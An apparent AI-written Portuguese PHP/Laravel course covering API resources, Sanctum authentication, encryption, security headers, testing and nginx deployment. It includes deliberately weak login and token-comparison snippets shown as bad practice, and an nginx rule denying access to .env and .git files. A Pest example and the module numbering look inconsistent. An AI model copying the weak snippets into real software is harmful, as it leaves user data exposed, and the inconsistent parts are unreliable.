            'categoria' => new CategoriaResource($this->whenLoaded('categoria')),

            // Campo condicional — só para admins
            'custo' => $this->when(
                $request->user()?->isAdmin(),
                $this->custo
            ),

            'criado_em'   => $this->created_at->toIso8601String(),
            'atualizado_em' => $this->updated_at->toIso8601String(),
        ];
    }
}

// Collection com metadados extras
class ProdutoCollection extends ResourceCollection
{
    public function toArray(Request $request): array
    {
        return [
            'data' => $this->collection,
            'meta' => [
                'total'     => $this->total(),
                'por_pagina'=> $this->perPage(),
                'pagina'    => $this->currentPage(),
            ],
        ];
    }
}
```

---

## Controller de API

```php
<?php
namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Http\Resources\ProdutoResource;
use App\Models\Produto;
use App\Http\Requests\ProdutoRequest;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Resources\Json\AnonymousResourceCollection;

class ProdutoController extends Controller
{
    public function index(): AnonymousResourceCollection
    {
        $produtos = Produto::with('categoria')
            ->ativo()
            ->paginate(15);

        return ProdutoResource::collection($produtos);
    }

    public function show(Produto $produto): ProdutoResource
    {
        $produto->load('categoria', 'avaliacoes');
        return new ProdutoResource($produto);
    }

    public function store(ProdutoRequest $request): JsonResponse
    {
        $produto = Produto::create($request->validated());

        return (new ProdutoResource($produto))
            ->response()
            ->setStatusCode(201);
    }

    public function update(ProdutoRequest $request, Produto $produto): ProdutoResource
    {
        $this->authorize('update', $produto);
        $produto->update($request->validated());
        return new ProdutoResource($produto->fresh('categoria'));
    }

    public function destroy(Produto $produto): JsonResponse
    {
        $this->authorize('delete', $produto);
        $produto->delete();
        return response()->json(null, 204);
    }
}
```

---

## Autenticação com Sanctum

```bash
composer require laravel/sanctum
php artisan vendor:publish --provider="Laravel\Sanctum\SanctumServiceProvider"
php artisan migrate
```

```php
<?php
namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Validation\ValidationException;

class AuthController extends Controller
{
    public function login(Request $request): JsonResponse
    {
        $request->validate([
            'email'   => ['required', 'email'],
            'senha'   => ['required'],
            'device'  => ['required', 'string'],
        ]);

        if (!Auth::attempt([
            'email'    => $request->email,
            'password' => $request->senha,
        ])) {
            throw ValidationException::withMessages([
                'email' => 'Credenciais inválidas.',
            ]);
        }

        $user  = $request->user();
        $token = $user->createToken(
            name:       $request->device,
            abilities:  ['*'],
            expiresAt:  now()->addDays(30),
        )->plainTextToken;

        return response()->json([
            'token'   => $token,
            'usuario' => [
                'id'    => $user->id,
                'nome'  => $user->name,
                'email' => $user->email,
            ],
        ]);
    }

    public function logout(Request $request): JsonResponse
    {
        // Revoga apenas o token atual
        $request->user()->currentAccessToken()->delete();

        return response()->json(['mensagem' => 'Logout realizado.']);
    }
}
```

---

## Tratamento de erros na API

```php
<?php
// app/Exceptions/Handler.php

use Illuminate\Auth\AuthenticationException;
use Illuminate\Database\Eloquent\ModelNotFoundException;
use Illuminate\Validation\ValidationException;
use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;

public function register(): void
{
    $this->renderable(function (\Throwable $e, Request $request) {
        if (!$request->expectsJson()) return null;

        return match(true) {
            $e instanceof ValidationException =>
                response()->json([
                    'mensagem' => 'Dados inválidos.',
                    'erros'    => $e->errors(),
                ], 422),

            $e instanceof ModelNotFoundException,
            $e instanceof NotFoundHttpException =>
                response()->json(['mensagem' => 'Recurso não encontrado.'], 404),

            $e instanceof AuthenticationException =>
                response()->json(['mensagem' => 'Não autenticado.'], 401),

            $e instanceof \Illuminate\Auth\Access\AuthorizationException =>
                response()->json(['mensagem' => 'Não autorizado.'], 403),

            default =>
                response()->json([
                    'mensagem' => 'Erro interno do servidor.',
                    'detalhe'  => config('app.debug') ? $e->getMessage() : null,
                ], 500),
        };
    });
}
```

---

## Rate Limiting

```php
<?php
// app/Providers/AppServiceProvider.php

use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Support\Facades\RateLimiter;

public function boot(): void
{
    RateLimiter::for('api', function (Request $request) {
        return Limit::perMinute(60)->by(
            $request->user()?->id ?? $request->ip()
        );
    });

    RateLimiter::for('login', function (Request $request) {
        return [
            Limit::perMinute(5)->by($request->ip()),
            Limit::perMinute(3)->by($request->input('email')),
        ];
    });
}

// Em routes/api.php:
Route::middleware(['throttle:login'])->group(function () {
    Route::post('/auth/login', [AuthController::class, 'login']);
});
```

---

## Resumo

| Recurso | Função |
|---|---|
| `routes/api.php` | Rotas stateless com prefixo `/api` |
| API Resources | Transforma models em JSON estruturado |
| Sanctum | Tokens de API para apps mobile e SPA |
| `$this->authorize()` | Verificação de permissão com Policy |
| Handler de erros | Respostas JSON consistentes para exceções |
| Rate Limiting | Proteção contra abuso com `throttle:` |

---

## Exercício da semana

1. Construa uma API RESTful completa para o recurso `Produto`: CRUD com validação via FormRequest, API Resource com campos condicionais por role, paginação com metadados.

2. Implemente autenticação com Sanctum: endpoints de login, logout e `/api/me`. Tokens com expiração de 24h. Proteja todas as rotas de escrita.

3. Configure o handler de erros para retornar JSON consistente em todos os cenários (404, 401, 403, 422, 500) com a estrutura `{ mensagem, erros? }`.

4. **Desafio:** implemente versionamento de API: `v1` e `v2` com namespaces e prefixos separados. No `v2`, adicione um campo `descricao_curta` no `ProdutoResource` (primeiros 100 chars da descrição) sem alterar o `v1`.

---

## Referências

- Laravel API Resources: https://laravel.com/docs/eloquent-resources
- Laravel Sanctum: https://laravel.com/docs/sanctum
- Laravel Rate Limiting: https://laravel.com/docs/routing#rate-limiting
- RESTful API Design — Melhores práticas: https://restfulapi.net/

---

**Módulo 7 completo** — 5 artigos (41–45) cobrindo Laravel do básico ao avançado.

**Progresso: 45/52 artigos.**

Próximo: **Módulo 8 — Segurança Avançada** (artigos 46–47), depois **Módulo 9 — Testes** (48–49), **Módulo 10 — Deploy** (50–51), e **Artigo 52 — Projeto Final**. Continuo?

---

# you asked

message time: 2026-03-10 08:41:16

Sim

---

# claude response

# Artigo 46 — Segurança Avançada em PHP

**Módulo 8 · Semana 46 · Nível: Avançado**

---

## Introdução

O artigo 37 cobriu os vetores mais comuns — XSS, CSRF e SQL Injection. Segurança avançada vai além: envolve criptografia correta, proteção de dados sensíveis, headers HTTP defensivos, auditoria de dependências, e a mentalidade de tratar segurança não como checklist, mas como camada contínua do processo de desenvolvimento.

Um sistema seguro não é aquele que nunca foi atacado. É aquele que, quando atacado, limita o dano ao mínimo possível.

---

## Criptografia simétrica com OpenSSL

Para criptografar dados sensíveis no banco (números de cartão, documentos, dados médicos), use criptografia simétrica com AES-256-GCM — o modo mais seguro disponível:

```php
<?php
declare(strict_types=1);

final class Criptografia
{
    private const ALGORITMO  = 'aes-256-gcm';
    private const TAG_LENGTH = 16;

    public function __construct(
        private readonly string $chave // 32 bytes — gerado com random_bytes(32)
    ) {
        if (strlen($this->chave) !== 32) {
            throw new \InvalidArgumentException('Chave deve ter exatamente 32 bytes.');
        }
    }

    public function criptografar(string $texto): string
    {
        $iv  = random_bytes(openssl_cipher_iv_length(self::ALGORITMO));
        $tag = '';

        $cifrado = openssl_encrypt(
            data:       $texto,
            cipher_algo: self::ALGORITMO,
            passphrase: $this->chave,
            options:    OPENSSL_RAW_DATA,
            iv:         $iv,
            tag:        $tag,
            tag_length: self::TAG_LENGTH,
        );

        if ($cifrado === false) {
            throw new \RuntimeException('Falha na criptografia.');
        }

        // Empacota: iv + tag + cifrado, tudo em base64
        return base64_encode($iv . $tag . $cifrado);
    }

    public function descriptografar(string $pacote): string
    {
        $dados = base64_decode($pacote, strict: true);
        if ($dados === false) {
            throw new \RuntimeException('Pacote inválido.');
        }

        $ivLen   = openssl_cipher_iv_length(self::ALGORITMO);
        $iv      = substr($dados, 0, $ivLen);
        $tag     = substr($dados, $ivLen, self::TAG_LENGTH);
        $cifrado = substr($dados, $ivLen + self::TAG_LENGTH);

        $texto = openssl_decrypt(
            data:        $cifrado,
            cipher_algo: self::ALGORITMO,
            passphrase:  $this->chave,
            options:     OPENSSL_RAW_DATA,
            iv:          $iv,
            tag:         $tag,
        );

        if ($texto === false) {
            throw new \RuntimeException('Falha na descriptografia — dados corrompidos ou chave incorreta.');
        }

        return $texto;
    }
}

// Uso:
$chave       = base64_decode($_ENV['ENCRYPTION_KEY']); // 32 bytes armazenados em base64 no .env
$cripto      = new Criptografia($chave);
$cifrado     = $cripto->criptografar('4111111111111111'); // número de cartão
$descriptografado = $cripto->descriptografar($cifrado);
```

**Gerar e armazenar a chave com segurança:**

```bash
# Gera uma chave de 32 bytes em base64 — armazene no .env, nunca no código
php -r "echo base64_encode(random_bytes(32)) . PHP_EOL;"
```

---

## Criptografia assimétrica para dados entre sistemas

Quando dois sistemas precisam trocar dados sensíveis, use RSA ou Ed25519:

```php
<?php

// Gerar par de chaves
$config = [
    'private_key_type' => OPENSSL_KEYTYPE_RSA,
    'private_key_bits' => 4096,
    'digest_alg'       => 'sha256',
];

$recurso    = openssl_pkey_new($config);
$chavePriv  = '';
openssl_pkey_export($recurso, $chavePriv);
$detalhes   = openssl_pkey_get_details($recurso);
$chavePub   = $detalhes['key'];

// Criptografar com chave pública (apenas quem tem a privada pode descriptografar)
openssl_public_encrypt('dados sensíveis', $cifrado, $chavePub);
$cifradoB64 = base64_encode($cifrado);

// Descriptografar com chave privada
openssl_private_decrypt(base64_decode($cifradoB64), $texto, $chavePriv);

// Assinar com chave privada (prova de autoria)
openssl_sign('mensagem', $assinatura, $chavePriv, OPENSSL_ALGO_SHA256);

// Verificar assinatura com chave pública
$valido = openssl_verify('mensagem', $assinatura, $chavePub, OPENSSL_ALGO_SHA256) === 1;
```

---

## Proteção de dados pessoais — LGPD na prática

A Lei Geral de Proteção de Dados exige que dados pessoais sejam coletados minimamente, protegidos adequadamente, e que usuários possam solicitar exclusão:

```php
<?php
declare(strict_types=1);

class RepositorioDeUsuario
{
    // Criptografa dados sensíveis antes de salvar
    public function salvar(DadosDeUsuario $dados, Criptografia $cripto): int
    {
        $stmt = $this->pdo->prepare("
            INSERT INTO usuarios (nome, email, cpf_criptografado, telefone_criptografado)
            VALUES (?, ?, ?, ?)
        ");

        $stmt->execute([
            $dados->nome,
            $dados->email,
            $cripto->criptografar($dados->cpf),       // PII criptografado em repouso
            $cripto->criptografar($dados->telefone),
        ]);

        return (int) $this->pdo->lastInsertId();
    }

    // Direito ao esquecimento — anonimização
    public function anonimizar(int $usuarioId): void
    {
        $this->pdo->prepare("
            UPDATE usuarios SET
                nome                 = 'Usuário Removido',
                email                = CONCAT('removido_', id, '@anonimo.local'),
                cpf_criptografado    = NULL,
                telefone_criptografado = NULL,
                anonimizado_em       = NOW()
            WHERE id = ?
        ")->execute([$usuarioId]);
    }

    // Log de acesso a dados pessoais (trilha de auditoria)
    public function registrarAcesso(int $usuarioId, int $acessadoPor, string $motivo): void
    {
        $this->pdo->prepare("
            INSERT INTO log_acesso_pii (usuario_id, acessado_por, motivo, ip, criado_em)
            VALUES (?, ?, ?, ?, NOW())
        ")->execute([$usuarioId, $acessadoPor, $motivo, $_SERVER['REMOTE_ADDR'] ?? '']);
    }
}
```

---

## Headers HTTP de segurança — configuração completa

```php
<?php
declare(strict_types=1);

final class HeadersDeSeguranca
{
    public static function aplicar(): void
    {
        // Impede MIME sniffing — o browser respeita o Content-Type declarado
        header('X-Content-Type-Options: nosniff');

        // Impede clickjacking — a página não pode ser carregada em iframe de outro domínio
        header('X-Frame-Options: DENY');

        // Força HTTPS por 1 ano (incluindo subdomínios)
        header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');

        // Controla informações enviadas no Referer
        header('Referrer-Policy: strict-origin-when-cross-origin');

        // Desativa recursos do browser que a aplicação não usa
        header('Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()');

        // Content Security Policy — política granular de fontes permitidas
        $csp = implode('; ', [
            "default-src 'self'",
            "script-src 'self' https://cdn.jsdelivr.net",
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
            "font-src 'self' https://fonts.gstatic.com",
            "img-src 'self' data: https:",
            "connect-src 'self'",
            "frame-ancestors 'none'",
            "base-uri 'self'",
            "form-action 'self'",
        ]);
        header("Content-Security-Policy: {$csp}");
    }
}
```

No Laravel, centralize isso em um middleware:

```php
<?php
namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class HeadersDeSeguranca
{
    public function handle(Request $request, Closure $next): Response
    {
        $response = $next($request);

        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set(
            'Strict-Transport-Security',
            'max-age=31536000; includeSubDomains'
        );

        return $response;
    }
}
```

---

## Auditoria de dependências

Dependências desatualizadas são um vetor frequente de ataque. Automatize a verificação:

```bash
# Verifica vulnerabilidades conhecidas nas dependências instaladas
composer audit

# Saída de exemplo:
# Found 1 security vulnerability advisory affecting 1 package:
# Package: vendor/pacote
# CVE: CVE-2024-XXXX
# Title: Remote Code Execution via unsanitized input
# URL: https://github.com/...

# Atualiza para versões seguras
composer update vendor/pacote

# Verificar dependências desatualizadas
composer outdated
```

No CI/CD, adicione `composer audit` como etapa obrigatória — o build falha se houver vulnerabilidades:

```yaml
# .github/workflows/security.yml
- name: Auditoria de segurança
  run: composer audit --no-dev
```

---

## Timing attacks e comparações seguras

```php
<?php

// VULNERÁVEL a timing attack — a comparação para no primeiro caractere diferente
if ($tokenEnviado === $tokenArmazenado) { }

// CORRETO — hash_equals tem tempo constante independente de onde diverge
if (!hash_equals($tokenArmazenado, $tokenEnviado)) {
    throw new \RuntimeException('Token inválido.');
}

// O mesmo princípio se aplica a qualquer comparação de segredo:
// API keys, tokens de webhook, assinaturas HMAC
$assinatura   = hash_hmac('sha256', $payload, $_ENV['WEBHOOK_SECRET']);
$assinaturaOk = hash_equals($assinatura, $assinaturaRecebida);
```

---

## Proteção contra enumeração de usuários

Um erro clássico é dar respostas diferentes para "email não existe" e "senha incorreta" — isso permite que atacantes descubram quais emails estão cadastrados:

```php
<?php

// RUIM — revela se o email existe
public function login(string $email, string $senha): bool
{
    $usuario = $this->repositorio->buscarPorEmail($email);

    if (!$usuario) {
        throw new \Exception('Email não cadastrado.'); // vaza informação
    }

    if (!password_verify($senha, $usuario->senhaHash)) {
        throw new \Exception('Senha incorreta.'); // também vaza
    }

    return true;
}

// BOM — mesma mensagem para ambos os casos
public function login(string $email, string $senha): bool
{
    $usuario = $this->repositorio->buscarPorEmail($email);

    // Executa password_verify mesmo quando o usuário não existe
    // para manter tempo de resposta constante (evita timing attack por ausência)
    $hashFalso = '$argon2id$v=19$m=65536,t=4,p=1$...'; // hash inválido mas bem formado
    $hashVerif = $usuario?->senhaHash ?? $hashFalso;

    if (!$usuario || !password_verify($senha, $hashVerif)) {
        throw new \RuntimeException('Credenciais inválidas.'); // mensagem genérica
    }

    return true;
}
```

---

## Resumo

| Técnica | Proteção |
|---|---|
| AES-256-GCM | Dados sensíveis em repouso |
| RSA / Ed25519 | Comunicação entre sistemas |
| Headers HTTP | XSS, clickjacking, MITM |
| `hash_equals()` | Timing attacks em comparações de segredos |
| `composer audit` | Vulnerabilidades em dependências |
| Mensagens genéricas de login | Enumeração de usuários |
| Anonimização | Conformidade com LGPD/GDPR |

---

## Exercício da semana

1. Implemente a classe `Criptografia` com AES-256-GCM. Criptografe CPF e telefone de usuários no banco. Garanta que a descriptografia funciona e que dados corrompidos lançam exceção.

2. Adicione o middleware de headers de segurança ao Laravel. Valide os headers com a ferramenta https://securityheaders.com/ (use ngrok ou similar para expor localmente).

3. Configure `composer audit` no pipeline de CI. Simule uma vulnerabilidade instalando uma versão antiga de um pacote e confirme que o build falha.

4. Refatore o sistema de login do artigo 35 para usar mensagem genérica de erro. Implemente o hash falso para garantir tempo de resposta constante.

5. **Desafio:** implemente assinatura de webhook: ao receber um POST de um sistema externo, valide a assinatura HMAC-SHA256 no header `X-Signature`. Rejeite requisições com assinatura inválida ou mais antigas que 5 minutos (use timestamp no payload).

---

## Referências

- OWASP Cryptographic Storage Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html
- PHP Manual — OpenSSL: https://www.php.net/manual/pt_BR/book.openssl.php
- LGPD — Lei 13.709/2018: https://www.planalto.gov.br/ccivil_03/_ato2015-2018/2018/lei/l13709.htm
- Security Headers: https://securityheaders.com/

---

# Artigo 47 — Testes Automatizados com PHPUnit e Pest

**Módulo 9 · Semana 47 · Nível: Intermediário–Avançado**

---

## Introdução

Testes automatizados são o seguro de vida do software. Sem eles, cada mudança no código é um salto no escuro — você não sabe o que quebrou até o usuário reclamar. Com eles, você refatora com confiança, entrega com velocidade e dorme tranquilo.

PHP tem duas ferramentas de teste de primeira linha: o PHPUnit, padrão da indústria há mais de 20 anos, e o Pest, uma camada mais moderna construída sobre o PHPUnit com sintaxe mais expressiva. Laravel integra ambos nativamente.

---

## PHPUnit — fundamentos

```bash
composer require --dev phpunit/phpunit
./vendor/bin/phpunit --init   # cria phpunit.xml
```

```php
<?php
declare(strict_types=1);

namespace Tests\Unit;

use App\Domain\Pedido\Dinheiro;
use PHPUnit\Framework\TestCase;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\Attributes\DataProvider;

class DinheiroTest extends TestCase
{
    #[Test]
    public function cria_dinheiro_com_valor_valido(): void
    {
        $d = new Dinheiro(1000); // centavos
        $this->assertSame(1000, $d->centavos());
        $this->assertSame('R$ 10,00', $d->formatar());
    }

    #[Test]
    public function soma_dois_valores(): void
    {
        $a = new Dinheiro(1000);
        $b = new Dinheiro(2500);

        $resultado = $a->somar($b);

        $this->assertSame(3500, $resultado->centavos());
        // Imutabilidade: a e b não foram alterados
        $this->assertSame(1000, $a->centavos());
        $this->assertSame(2500, $b->centavos());
    }

    #[Test]
    public function lanca_excecao_para_valor_negativo(): void
    {
        $this->expectException(\InvalidArgumentException::class);
        $this->expectExceptionMessage('Valor não pode ser negativo');

        new Dinheiro(-1);
    }

    #[Test]
    #[DataProvider('provedorDeDescontos')]
    public function aplica_desconto_corretamente(int $centavos, float $percentual, int $esperado): void
    {
        $dinheiro  = new Dinheiro($centavos);
        $resultado = $dinheiro->aplicarDesconto($percentual);

        $this->assertSame($esperado, $resultado->centavos());
    }

    public static function provedorDeDescontos(): array
    {
        return [
            'desconto zero'     => [1000, 0.0,  1000],
            'desconto 10%'      => [1000, 10.0, 900],
            'desconto 50%'      => [2000, 50.0, 1000],
            'desconto completo' => [1000, 100.0, 0],
        ];
    }
}
```

---

## Mocks e stubs — isolando dependências

```php
<?php
declare(strict_types=1);

namespace Tests\Unit;

use App\Services\CadastroService;
use App\Repositories\UsuarioRepositorioInterface;
use App\Services\EmailService;
use App\Models\Usuario;
use PHPUnit\Framework\TestCase;
use PHPUnit\Framework\Attributes\Test;

class CadastroServiceTest extends TestCase
{
    #[Test]
    public function cadastra_usuario_e_envia_email(): void
    {
        // Stub do repositório — retorna usuário salvo
        $repositorio = $this->createMock(UsuarioRepositorioInterface::class);
        $repositorio
            ->expects($this->once())         // deve ser chamado exatamente 1 vez
            ->method('salvar')
            ->willReturn(new Usuario(id: 1, nome: 'Alice', email: 'alice@teste.com'));

        // Mock do email — verifica que foi chamado
        $emailService = $this->createMock(EmailService::class);
        $emailService
            ->expects($this->once())
            ->method('enviarBoasVindas')
            ->with($this->callback(fn(Usuario $u) => $u->email === 'alice@teste.com'));

        $service = new CadastroService($repositorio, $emailService);
        $usuario = $service->cadastrar(new DadosDeCadastro(
            nome:  'Alice',
            email: 'alice@teste.com',
            senha: 'Senh@Segura123',
        ));

        $this->assertSame('Alice', $usuario->nome);
        $this->assertSame(1, $usuario->id);
    }

    #[Test]
    public function nao_envia_email_se_cadastro_falhar(): void
    {
        $repositorio = $this->createMock(UsuarioRepositorioInterface::class);
        $repositorio
            ->method('salvar')
            ->willThrowException(new \RuntimeException('Falha no banco'));

        $emailService = $this->createMock(EmailService::class);
        $emailService->expects($this->never())->method('enviarBoasVindas');

        $service = new CadastroService($repositorio, $emailService);

        $this->expectException(\RuntimeException::class);
        $service->cadastrar(new DadosDeCadastro('Alice', 'alice@teste.com', 'Senh@Segura123'));
    }
}
```

---

## Testes de integração com banco de dados

```php
<?php
declare(strict_types=1);

namespace Tests\Integration;

use App\Repositories\UsuarioRepositorioPDO;
use PHPUnit\Framework\TestCase;

class UsuarioRepositorioPDOTest extends TestCase
{
    private \PDO $pdo;
    private UsuarioRepositorioPDO $repositorio;

    protected function setUp(): void
    {
        // SQLite em memória — rápido e isolado
        $this->pdo = new \PDO('sqlite::memory:', options: [
            \PDO::ATTR_ERRMODE            => \PDO::ERRMODE_EXCEPTION,
            \PDO::ATTR_DEFAULT_FETCH_MODE => \PDO::FETCH_ASSOC,
        ]);
        $this->pdo->exec('PRAGMA foreign_keys = ON');

        // Roda o mesmo schema de produção
        $this->pdo->exec(file_get_contents(__DIR__ . '/../../database/schema.sql'));

        $this->repositorio = new UsuarioRepositorioPDO($this->pdo);
    }

    public function test_salvar_e_buscar_por_id(): void
    {
        $id      = $this->repositorio->salvar(new DadosDeUsuario('Alice', 'alice@teste.com'));
        $usuario = $this->repositorio->buscarPorId($id);

        $this->assertNotNull($usuario);
        $this->assertSame('Alice', $usuario->nome);
        $this->assertSame('alice@teste.com', $usuario->email);
    }

    public function test_buscar_por_email_retorna_null_para_inexistente(): void
    {
        $usuario = $this->repositorio->buscarPorEmail('naoexiste@teste.com');
        $this->assertNull($usuario);
    }
}
```

---

## Pest — sintaxe moderna

```bash
composer require --dev pestphp/pest pestphp/pest-plugin-laravel
./vendor/bin/pest --init
```

```php
<?php
// tests/Unit/DinheiroTest.php

use App\Domain\Pedido\Dinheiro;

describe('Dinheiro', function () {

    it('cria com valor válido', function () {
        $d = new Dinheiro(1000);
        expect($d->centavos())->toBe(1000);
        expect($d->formatar())->toBe('R$ 10,00');
    });

    it('soma dois valores corretamente', function () {
        $resultado = (new Dinheiro(1000))->somar(new Dinheiro(2500));
        expect($resultado->centavos())->toBe(3500);
    });

    it('lança exceção para valor negativo', function () {
        expect(fn() => new Dinheiro(-1))
            ->toThrow(\InvalidArgumentException::class, 'Valor não pode ser negativo');
    });

    it('aplica desconto corretamente')->with([
        [1000, 10.0, 900],
        [2000, 50.0, 1000],
        [1000, 0.0,  1000],
    ])->expect(function (int $centavos, float $pct, int $esperado) {
        expect((new Dinheiro($centavos))->aplicarDesconto($pct)->centavos())->toBe($esperado);
    });

});
```

---

## Testes de feature no Laravel

```php
<?php
// tests/Feature/ProdutoApiTest.php

use App\Models\Produto;
use App\Models\User;

describe('API de Produtos', function () {

    it('lista produtos paginados', function () {
        Produto::factory()->count(20)->create();

        $response = $this->getJson('/api/produtos');

        $response
            ->assertOk()
            ->assertJsonStructure([
                'data' => [['id', 'nome', 'preco']],
                'meta' => ['total', 'por_pagina', 'pagina'],
            ])
            ->assertJsonCount(15, 'data'); // paginação de 15
    });

    it('cria produto com autenticação', function () {
        $admin = User::factory()->admin()->create();

        $response = $this->actingAs($admin, 'sanctum')
            ->postJson('/api/produtos', [
                'nome'         => 'Teclado Mecânico',
                'preco'        => 299.90,
                'estoque'      => 10,
                'categoria_id' => 1,
            ]);

        $response->assertCreated()->assertJsonPath('data.nome', 'Teclado Mecânico');
        $this->assertDatabaseHas('produtos', ['nome' => 'Teclado Mecânico']);
    });

    it('recusa criação sem autenticação', function () {
        $this->postJson('/api/produtos', ['nome' => 'Teste'])
            ->assertUnauthorized();
    });

    it('retorna 404 para produto inexistente', function () {
        $this->getJson('/api/produtos/99999')
            ->assertNotFound()
            ->assertJsonPath('mensagem', 'Recurso não encontrado.');
    });

});
```

---

## Cobertura de código

```bash
# Requer a extensão Xdebug ou PCOV
php -d xdebug.mode=coverage vendor/bin/phpunit --coverage-html=coverage/

# Com Pest
./vendor/bin/pest --coverage --min=80  # falha se cobertura < 80%
```

---

## Resumo

| Tipo de teste | O que testa | Ferramenta |
|---|---|---|
| Unit | Lógica de uma classe isolada | PHPUnit / Pest |
| Integration | Repositório + banco de dados real | PHPUnit + SQLite |
| Feature | Fluxo HTTP completo (rota → controller → banco) | Laravel + Pest |
| Mock | Simula dependências externas | `createMock()` / Mockery |
| Data Provider | Mesma lógica com múltiplos inputs | `#[DataProvider]` / `->with()` |

---

## Exercício da semana

1. Escreva testes unitários para a classe `Dinheiro` cobrindo: criação válida, soma, subtração, multiplicação, desconto, igualdade, formatação, e todos os casos de erro.

2. Escreva testes de integração para um repositório PDO usando SQLite em memória. Cubra: salvar, buscar por ID, buscar por email, listar, deletar, e verificar que FK é respeitada.

3. Escreva testes de feature para a API de produtos: GET lista (com paginação), GET por ID, POST (autenticado e não autenticado), PUT, DELETE. Use factories para os dados.

4. Configure o CI para rodar os testes com cobertura mínima de 70% — o build deve falhar abaixo disso.

5. **Desafio:** implemente mutation testing com Infection PHP (`infection/infection`). Analise os mutantes sobreviventes — eles indicam testes que verificam execução mas não resultados. Corrija pelo menos 5.

---

## Referências

- PHPUnit Documentation: https://phpunit.de/documentation.html
- Pest PHP: https://pestphp.com/
- Laravel Testing: https://laravel.com/docs/testing
- Infection — Mutation Testing: https://infection.github.io/

---

# Artigo 48 — Deploy e Ambiente de Produção

**Módulo 10 · Semana 48 · Nível: Avançado**

---

## Introdução

Saber desenvolver é necessário, mas não suficiente. Um sistema que funciona perfeitamente no seu computador e nunca chega ao servidor de produção não tem valor. Deploy é o ato de levar o código do repositório para o servidor — e fazê-lo de forma segura, repetível e rastreável.

---

## Configuração do servidor — NGINX + PHP-FPM

PHP-FPM (FastCGI Process Manager) é como o PHP roda em produção real: gerencia um pool de processos PHP separado do servidor web. NGINX recebe as requisições e as passa para o PHP-FPM processar:

```nginx
# /etc/nginx/sites-available/minha-loja
server {
    listen 80;
    server_name minha-loja.com.br www.minha-loja.com.br;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name minha-loja.com.br www.minha-loja.com.br;

    root /var/www/minha-loja/public;
    index index.php;

    # SSL — gerado com Let's Encrypt / Certbot
    ssl_certificate     /etc/letsencrypt/live/minha-loja.com.br/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/minha-loja.com.br/privkey.pem;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;

    # Laravel: rota todas as requisições para index.php
    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        fastcgi_pass   unix:/var/run/php/php8.3-fpm.sock;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include        fastcgi_params;
        fastcgi_read_timeout 300;
    }

    # Bloqueia acesso direto a arquivos sensíveis
    location ~ /\.(env|git|htaccess) {
        deny all;
    }

    # Cache de assets estáticos
    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg|woff2)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }

    # Logs
    access_log /var/log/nginx/minha-loja.access.log;
    error_log  /var/log/nginx/minha-loja.error.log;
}
```

---

## PHP-FPM — configuração do pool

```ini
; /etc/php/8.3/fpm/pool.d/minha-loja.conf
[minha-loja]
user  = www-data
group = www-data

listen = /var/run/php/php8.3-fpm.sock
listen.owner = www-data
listen.group = www-data

; Gerenciamento de processos
pm                   = dynamic
pm.max_children      = 20
pm.start_servers     = 5
pm.min_spare_servers = 3
pm.max_spare_servers = 8
pm.max_requests      = 500    ; reinicia o processo após 500 requisições (evita memory leaks)

; Timeout
request_terminate_timeout = 60s

; Logs de slowlog
slowlog = /var/log/php-fpm/minha-loja.slow.log
request_slowlog_timeout = 5s
```

---

## Deploy com zero downtime — script completo

```bash
#!/bin/bash
# deploy.sh — executa no servidor de produção

set -euo pipefail  # para em qualquer erro

PROJETO_DIR="/var/www/minha-loja"
BRANCH="${1:-main}"

echo "🚀 Iniciando deploy — branch: $BRANCH"
cd $PROJETO_DIR

# 1. Ativa modo de manutenção (Laravel)
php artisan down --secret="token-secreto-de-bypass"
echo "✅ Modo de manutenção ativado"

# 2. Atualiza o código
git fetch origin
git reset --hard origin/$BRANCH
echo "✅ Código atualizado"

# 3. Instala dependências (sem dev, otimizado)
composer install --no-dev --optimize-autoloader --no-interaction
echo "✅ Dependências instaladas"

# 4. Roda migrations
php artisan migrate --force
echo "✅ Migrations executadas"

# 5. Otimizações do Laravel
php artisan config:cache      # cache de configurações
php artisan route:cache       # cache de rotas
php artisan view:cache        # pre-compila templates Blade
php artisan event:cache       # cache de event listeners
echo "✅ Cache otimizado"

# 6. Reinicia workers de fila (se houver)
php artisan queue:restart
echo "✅ Workers de fila reiniciados"

# 7. Recarrega PHP-FPM (graceful — sem derrubar requisições em andamento)
sudo systemctl reload php8.3-fpm
echo "✅ PHP-FPM recarregado"

# 8. Desativa modo de manutenção
php artisan up
echo "🎉 Deploy concluído com sucesso!"
```

---

## GitHub Actions — CI/CD completo

```yaml
# .github/workflows/deploy.yml
name: Testes e Deploy

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  testes:
    name: Testes
    runs-on: ubuntu-latest

    services:
      mysql:
        image: mysql:8.0
        env:
          MYSQL_DATABASE: teste
          MYSQL_ROOT_PASSWORD: senha
        ports: ['3306:3306']
        options: --health-cmd="mysqladmin ping" --health-interval=10s

    steps:
      - uses: actions/checkout@v4

      - name: Instalar PHP 8.3
        uses: shivammathur/setup-php@v2
        with:
          php-version: '8.3'
          extensions: mbstring, pdo, pdo_mysql, gd, redis
          coverage: xdebug

